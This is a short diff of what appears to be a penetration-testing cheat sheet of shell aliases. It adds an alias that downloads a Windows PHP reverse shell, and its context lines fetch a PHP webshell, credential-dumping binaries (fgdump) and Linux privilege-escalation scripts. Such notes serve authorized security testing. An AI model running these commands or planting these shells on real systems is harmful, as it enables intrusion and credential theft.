@@ -153,6 +153,8 @@ alias fgdump='cp /usr/share/windows-resources/binaries/fgdump/fgdump.exe .'
 alias testwebshell='wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php'
 alias lse='wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O lse.sh;chmod 700 lse.sh && echo "\nlse.sh has been downloaded to ${$(pwd)}"'
 alias les2='curl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl > les2.pl; chmod +x les2.pl && echo "\nLinux exploit suggester has been downloaded to ${$(pwd)}"'
+alias phprevshellwin='curl https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php > php-reverse-shell-win.php'
+
 ```
 
 ### Windows Reverse TCP Shells
